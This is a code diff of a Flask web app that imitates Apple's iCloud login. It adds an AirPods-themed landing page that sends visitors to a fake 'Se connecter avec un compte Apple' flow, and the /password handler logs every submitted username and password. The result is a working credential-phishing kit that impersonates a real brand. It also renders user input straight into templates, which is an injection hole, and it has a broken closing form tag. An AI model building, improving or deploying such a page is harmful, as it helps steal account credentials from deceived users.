@@ -1,16 +1,64 @@
-from flask import Flask, request, render_template_string, redirect, url_for
+from flask import Flask, render_template_string, request, redirect, url_for
 
 app = Flask(__name__)
+app.secret_key = 'votre_cle_secrete_ici'
 
-# Données de session simulées (en production, utiliser Flask-Session)
-app.secret_key = 'votre_cle_secrete_ici'  # Nécessaire pour les sessions
-
-# Configuration pour les identifiants valides
 VALID_CREDENTIALS = {
     'username': 'youva',
     'password': '1234'
 }
 
+# Page AirPods d'accueil
+airpods_page = """
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>AirPods - Connexion iCloud</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #f5f5f7;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+        }
+        .airpods-image {
+            width: 200px;
+            margin-bottom: 30px;
+        }
+        .login-button {
+            background-color: #0071e3;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 12px 25px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            text-decoration: none;
+        }
+        .login-button:hover {
+            background-color: #0062c3;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://i.ibb.co/zHQBkrHX/airpods.jpg" 
+         alt="AirPods" class="airpods-image">
+    <h1>AirPods</h1>
+    <a href="/login" class="login-button">Connectez-vous avec iCloud</a>
+</body>
+</html>
+"""
+
+# Login interface Apple-style
 base_html = """
 <!DOCTYPE html>
 <html lang="fr">
@@ -77,7 +125,10 @@ base_html = """
             cursor: pointer;
             padding: 0 5px;
         }}
-        .checkbox-container {{
+        .submit-btn:hover {{
+            background-color: #005bb5;
+        }}
+         .checkbox-container {{
             text-align: left;
             margin: 20px 0;
             font-size: 14px;
@@ -95,11 +146,10 @@ base_html = """
         }}
         .error-message {{
             color: #ff3b30;
-            font-size: 13px;
-            margin: -10px 0 15px 0;
-            text-align: left;
+            font-size: 14px;
+            margin-bottom: 20px;
         }}
-        .username-display {{
+                .username-display {{
             text-align: left;
             font-size: 14px;
             color: #1d1d1f;
@@ -113,8 +163,7 @@ base_html = """
         text-align: left;
         font-size: 14px;
         }}
-    
-        .username-label {{
+                .username-label {{
             color: #86868b;
             font-size: 12px;
         }}
@@ -127,12 +176,11 @@ base_html = """
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" 
-             alt="Apple Logo" class="apple-logo">
-        <h1>Se connecter avec un compte Apple</h1>
-        {content}
-    </div>
+<div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
+    <h2>Se connecter avec un compte Apple</h2>
+    {content}
+</div>
 </body>
 </html>
 """
@@ -169,7 +217,7 @@ password_screen = """
     </div>
     <a href="#" class="link">Mot de passe oublié?</a>
     <a href="#" class="link">Créer un compte Apple</a>
-</form>
+</form
 """
 
 error_screen = """
@@ -198,36 +246,31 @@ success_screen = """
 </div>
 """
 
-@app.route("/", methods=["GET", "POST"])
+# Flask routes
+
+@app.route("/")
 def home():
-    if request.method == "POST":
-        username = request.form.get("username", "").strip()
-        return redirect(url_for("handle_username", username=username))
-    
+    return render_template_string(airpods_page)
+
+@app.route("/login", methods=["GET"])
+def login():
     return render_template_string(base_html.format(content=username_screen))
 
-@app.route("/username", methods=["GET", "POST"])
+@app.route("/username", methods=["POST"])
 def handle_username():
-    if request.method == "POST":
-        username = request.form.get("username", "").strip()
-        return render_template_string(base_html.format(
-            content=password_screen.format(username=username)
-        ))
-    
-    return redirect(url_for("home"))
+    username = request.form.get("username", "").strip()
+    return render_template_string(base_html.format(
+        content=password_screen.format(username=username)
+    ))
 
 @app.route("/password", methods=["POST"])
 def handle_password():
     username = request.form.get("username", "").strip()
     password = request.form.get("password", "").strip()
-    
-    # Enregistrement côté serveur (simulé)
-    print(f"\n[LOG] Tentative de connexion reçue:")
-    print(f"Username: {username}")
-    print(f"Password: {password}\n")
-    
-    # Validation des identifiants
-    if username == VALID_CREDENTIALS['username'] and password == VALID_CREDENTIALS['password']:
+
+    print(f"[REÇU] Username: {username}, Password: {password}")
+
+    if username == VALID_CREDENTIALS["username"] and password == VALID_CREDENTIALS["password"]:
         return render_template_string(base_html.format(
             content=success_screen.format(username=username)
         ))
